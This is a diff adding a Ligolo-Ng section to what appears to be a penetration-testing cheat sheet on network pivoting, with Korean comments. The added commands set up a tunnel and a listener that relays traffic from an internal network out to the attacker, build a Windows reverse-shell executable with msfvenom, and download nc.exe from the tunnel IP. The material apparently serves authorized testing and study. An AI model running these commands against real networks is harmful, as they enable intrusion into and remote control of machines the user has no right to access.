@@ -17,6 +17,43 @@ netstat -r
 for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
 ```
 ---
+## Ligolo-Ng
+```bash
+# server
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+tar -xvzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz
+sudo ./proxy -selfcert
+```
+```powershell
+# client
+./agent.exe -connect <rhost>:11601 -ignore-cert
+```
+```bash
+# ligolo-ng
+ifconfig
+
+session
+
+# 내부망에서 외부망으로 패킷 전달
+listener_add --addr 0.0.0.0:8888 --to <lhost>:80
+```
+```bash
+# 터널링 된 ip로 연결하면 외부망으로 연결 됨.
+msfvenom -p windows/shell_reverse_tcp lhost=<tunneling ip> lport=8888 -f exe -o shell.exe
+```
+```powershell
+curl http://<tunneling ip>:8888/nc.exe -o c:\temp\nc.exe
+```
+```bash
+ip route add 192.168.148.0/24 dev ligolo #internal IP
+ip route list
+```
+```bash
+# ligolo-ng
+start
+```
+---
 ## Chisel
 
 ### Forward Proxy 모드
